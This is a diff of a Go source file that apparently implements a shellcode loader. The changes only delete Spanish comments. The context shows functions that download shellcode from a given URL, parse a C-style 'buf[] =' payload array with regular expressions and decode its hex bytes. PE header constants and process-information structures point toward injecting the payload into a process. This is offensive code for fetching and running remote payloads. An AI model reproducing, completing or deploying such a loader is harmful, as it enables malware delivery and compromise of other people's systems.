@@ -108,7 +108,6 @@ cleanup:
 */
 import "C"
 
-// === TU CÓDIGO ORIGINAL (SIN CAMBIOS) ===
 
 const (
     IMAGE_DOS_SIGNATURE              = 0x5A4D
@@ -269,7 +268,6 @@ type PROCESS_BASIC_INFORMATION struct {
     Reserved3           uintptr
 }
 
-// === FUNCIÓN MODIFICADA ===
 func executeLoader(shellcodeURL string) {
 	fmt.Printf("[*] Downloading shellcode from: %s\n", shellcodeURL)
 	shellcode, err := readShellcodeFromURL(shellcodeURL) // Usamos tu función de Go
@@ -310,15 +308,12 @@ func readShellcodeFromURL(url string) ([]byte, error) {
 
 	content := string(body)
 
-	// Busca desde 'buf[] =' hasta el último punto y coma
 	re := regexp.MustCompile(`buf\[\]\s*=\s*(?:"(?:[^"\\]|\\.)*"(?:\s*")?(?:[^"]*)?)*;`)
 	match := re.FindString(content)
 	if match == "" {
 		return nil, fmt.Errorf("no shellcode pattern found")
 	}
 
-	// Extrae solo el contenido entre comillas
-	// Busca todos los bloques entre comillas: "..."
 	reChunks := regexp.MustCompile(`"((?:[^"\\]|\\.)*)"`)
 	chunks := reChunks.FindAllStringSubmatch(match, -1)
 
@@ -327,14 +322,13 @@ func readShellcodeFromURL(url string) ([]byte, error) {
 		if len(chunk) < 2 {
 			continue
 		}
-		// Remueve \x y une
 		clean := strings.ReplaceAll(chunk[1], "\\x", "")
 		hexBuilder.WriteString(clean)
 	}
 
 	hexStr := hexBuilder.String()
 
-	// Asegurarnos de que tenga longitud par
+
 	if len(hexStr)%2 != 0 {
 		return nil, fmt.Errorf("hex string has odd length")
 	}
